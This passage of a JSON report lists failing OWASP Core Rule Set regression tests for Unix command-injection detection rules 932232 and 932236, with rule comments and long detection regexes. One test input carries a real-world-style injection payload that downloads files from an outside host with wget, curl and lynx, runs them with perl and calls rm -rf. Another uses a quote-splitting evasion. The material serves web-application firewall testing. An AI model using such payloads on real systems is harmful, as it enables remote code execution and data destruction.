          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932232",
    "test_id" : 7,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932232.yaml",
    "description" : "Remote Command Injection test for BB finding 935E1D91 - time evasion attempt",
    "cause" : "failed expect_id check: 932232 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Remote Command Injection test for BB finding 935E1D91 - time evasion attempt",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=ti''me+who",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932232 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932232,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule targets pefix + commans that are prone to false positive detection at PL3."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932232.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932232"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?2[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s)|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?f|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o|(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932232
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932236",
    "test_id" : 21,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932236.yaml",
    "description" : "System Command Injection (932236) from old modsec regressions",
    "cause" : "failed expect_id check: 932236 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 21,
      "desc" : "System Command Injection (932236) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932236 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932236,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a stricter sibling of rules 932230, 932235, 932250, 932260."
        }, {
          "type" : "Comment",
          "text" : " This stricter sibling detects Unix RCE with and without prefix and words of any length."
        }, {
          "type" : "Comment",
          "text" : " It uses the same regex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932236.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932236"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h